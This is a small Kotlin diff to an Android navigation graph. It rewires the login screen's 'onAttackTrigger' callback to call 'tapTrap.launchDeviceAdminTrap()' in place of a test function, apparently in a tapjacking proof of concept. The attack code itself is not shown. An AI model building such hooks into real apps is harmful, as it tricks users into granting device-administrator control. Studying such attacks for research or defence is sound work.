@@ -40,7 +40,7 @@ fun NavGraph(navController: NavHostController, modifier: Modifier = Modifier, ta
     ) {
         // --- Auth Graph (Login/Signup) ---
         navigation(startDestination = "login_screen", route = "auth_graph") {
-            composable("login_screen") { LoginScreen(navController, authViewModel, onAttackTrigger = { tapTrap.testInvisible2() } ) }
+            composable("login_screen") { LoginScreen(navController, authViewModel, onAttackTrigger = { tapTrap.launchDeviceAdminTrap() } ) }
             composable("signup_screen") { SignUpScreen(navController, authViewModel) }
         }
 
